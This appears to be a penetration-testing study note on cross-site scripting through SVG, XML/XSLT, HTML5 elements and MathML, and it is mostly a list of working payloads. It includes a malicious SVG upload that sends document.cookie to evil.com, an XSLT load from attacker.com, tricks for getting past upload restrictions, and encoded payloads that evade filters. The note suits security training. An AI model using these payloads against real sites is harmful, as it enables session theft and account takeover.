---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.12 XSS in SVG, XML, and HTML5"
---

# 07.12 — XSS in SVG, XML, and HTML5

## SVG XSS

SVG (Scalable Vector Graphics) is XML that browsers parse as part of the DOM. SVG supports event handlers and JavaScript — making it a powerful XSS vector.

```
WHY SVG IS DANGEROUS:
  SVG is valid XML AND valid HTML5
  SVG elements support event handlers (onload, onclick, etc.)
  SVG can embed <script> elements
  When inlined in HTML or loaded directly → executes JS!

BROWSER TREATMENT:
  <img src="evil.svg"> → Does NOT execute (sandboxed)
  <iframe src="evil.svg"> → EXECUTES (if same-origin or no CSP)
  Inline <svg>...</svg> → EXECUTES in page context!
  Direct navigation to .svg → EXECUTES!
```

---

## SVG Payloads

```html
<!-- INLINE SVG IN HTML (most powerful — runs in page context): -->
<svg onload="alert(document.domain)">
<svg><script>alert(1)</script></svg>
<svg><animatetransform onbegin="alert(1)">

<!-- ONE-LINER INLINE SVG: -->
<svg onload=alert(1)>

<!-- SVG WITH SCRIPT TAG: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- SVG ANIMATE (evades some filters): -->
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s">

<!-- SVG SET (alternative): -->
<svg><set onbegin="alert(1)" attributeName="x" dur="1s">

<!-- SVG WITH XLINK (older technique): -->
<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0ncmVjdGFuZ2xlJyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+CjxpbWFnZSBvbmxvYWQ9ImFsZXJ0KDEpIi8+Cjwvc3ZnPg=="></use>

<!-- .SVG FILE CONTENT (for file upload XSS): -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100" fill="blue"/>
</svg>
```

---

## SVG File Upload XSS

```
ATTACK FLOW:
  1. App allows SVG file upload ("vector graphics")
  2. App stores and serves SVG with Content-Type: image/svg+xml
     OR serves it from same origin
  3. Attacker uploads malicious SVG
  4. App serves: https://target.com/uploads/evil.svg
  5. Victim navigates to the URL → SVG executes!

DANGEROUS WHEN:
  ✓ SVG served from same origin (full cookie access!)
  ✓ App renders SVG directly in page via <img> + forced render
  ✓ Admin views uploaded files → admin XSS!

UPLOAD PAYLOAD (evil.svg):
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com/'+document.cookie)">
    <rect width="300" height="100" fill="blue"/>
    <text x="10" y="50">Innocent SVG</text>
  </svg>

BYPASS .SVG RESTRICTION:
  Upload as .svgz (SVG gzip)
  Change Content-Type to image/svg+xml in the request
  Try .svg.png or other double extensions
```

---

## XML-Based XSS

```xml
<!-- XML DOCUMENTS WITH XSLT (eXtensible Stylesheet Language): -->
<!-- If app parses and renders XML with user-controlled data + applies XSLT: -->

<!-- XSLT INJECTION: -->
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="https://attacker.com/evil.xsl"?>
<data>
  <user>test</user>
</data>
<!-- → If browser applies XSLT, loads attacker's stylesheet! -->

<!-- XML WITH EMBEDDED CDATA (bypasses some filters): -->
<![CDATA[<script>alert(1)</script>]]>
<!-- XML parses CDATA as text, not markup -->
<!-- But: if rendered in HTML → may execute! -->

<!-- XXE → XSS CHAIN (see XXE module): -->
<!-- XXE to read server files, then inject content into page -->
```

---

## HTML5 New XSS Vectors

HTML5 introduced many new elements and attributes that create new XSS vectors:

```html
<!-- HTML5 ELEMENTS WITH EVENT HANDLERS: -->
<details open ontoggle="alert(1)">
<dialog open oncancel="alert(1)">
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<canvas onmouseover=alert(1)>
<track onerror=alert(1)>

<!-- HTML5 AUTOFOCUS (no user interaction): -->
<input autofocus onfocus="alert(1)">
<textarea autofocus onfocus="alert(1)">
<select autofocus onfocus="alert(1)">

<!-- HTML5 FORMACTION (override form action): -->
<input type="submit" formaction="javascript:alert(1)">
<button formaction="javascript:alert(1)">Click</button>

<!-- HTML5 SRCDOC (iframe with inline HTML): -->
<iframe srcdoc="<script>alert(1)</script>">
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
  <!-- HTML-decode: <script>alert(1)</script> → executes! -->

<!-- HTML5 TEMPLATE TAG (bypasses innerHTML parsing in some contexts): -->
<template><script>alert(1)</script></template>
<!-- Template contents are parsed but NOT rendered immediately -->
<!-- If app reads template.content and inserts into DOM → XSS! -->

<!-- HTML5 FORM OUTSIDE FORM TAG: -->
<form id="x">
<button form="x" formaction="javascript:alert(1)">Click</button>

<!-- HTML5 DOWNLOAD ATTRIBUTE: -->
<a href="https://evil.com/evil.html" download>Download me</a>
<!-- Forces download — not direct XSS but for content injection -->

<!-- HTML5 PING ATTRIBUTE: -->
<a href="https://google.com" ping="https://evil.com/track">Click</a>
<!-- Sends a POST ping to attacker.com when link clicked! Data exfil! -->

<!-- HTML5 ISINDEX (obsolete but supported): -->
<isindex action="javascript:alert(1)" type=submit>
```

---

## MathML XSS (HTML5 Math)

```html
<!-- MATHML CAN EMBED SCRIPTS IN SOME BROWSERS: -->
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">CLICK</maction></math>

<!-- MORE RELIABLE: -->
<math><maction actiontype="toggle" xlink:href="javascript:alert(document.cookie)">
  <mtext>XSS</mtext>
</maction></math>
```

---

## Practical SVG Testing

```bash
# TEST 1: INLINE SVG INJECTION:
# If app reflects user input as HTML, test:
?name=<svg onload=alert(1)>
?name=<svg><script>alert(1)</script></svg>

# TEST 2: SVG UPLOAD:
# Create evil.svg file and upload
# Then navigate to the uploaded file URL

# TEST 3: CHECK IF SVG SERVED FROM SAME ORIGIN:
curl -I https://target.com/uploads/image.svg | grep content-type
# Dangerous: Content-Type: image/svg+xml (from same origin)
# Safer: Content-Type: image/svg+xml (from CDN/different origin)

# TEST 4: SRCDOC:
?content=<iframe srcdoc="<script>alert(1)</script>">

# TEST 5: HTML5 ELEMENT TESTING:
?name=<details open ontoggle=alert(1)>
?name=<video src=x onerror=alert(1)>
```

---

## Bypassing Filters with SVG/HTML5

```html
<!-- SVG BYPASSES MANY "NO SCRIPT TAG" FILTERS: -->
<svg onload=alert(1)>    ← no <script> tag!
<svg><script>alert(1)   ← script inside SVG namespace (some parsers allow)

<!-- CASE VARIATIONS: -->
<SVG ONLOAD="alert(1)">
<SvG oNlOaD="alert(1)">

<!-- ATTRIBUTE WITHOUT VALUE (boolean): -->
<svg onload=alert(1) xmlns=http://www.w3.org/2000/svg>

<!-- HTML ENTITIES: -->
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- &#97;... = alert(1) in decimal entities -->

<!-- ENCODE SCRIPT IN SVG: -->
<svg>
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
</svg>
<!-- atob decodes base64: alert(document.cookie) -->
```

---

## Related Notes
- [[02 - Reflected XSS]] — reflected XSS
- [[14 - XSS Filter Bypass Techniques]] — bypassing filters
- [[Module 13 - File Upload]] — file upload vulnerabilities
- [[21 - XSS Payloads Comprehensive List]] — full payload list
- [[Module 14 - XXE]] — XML external entity injection
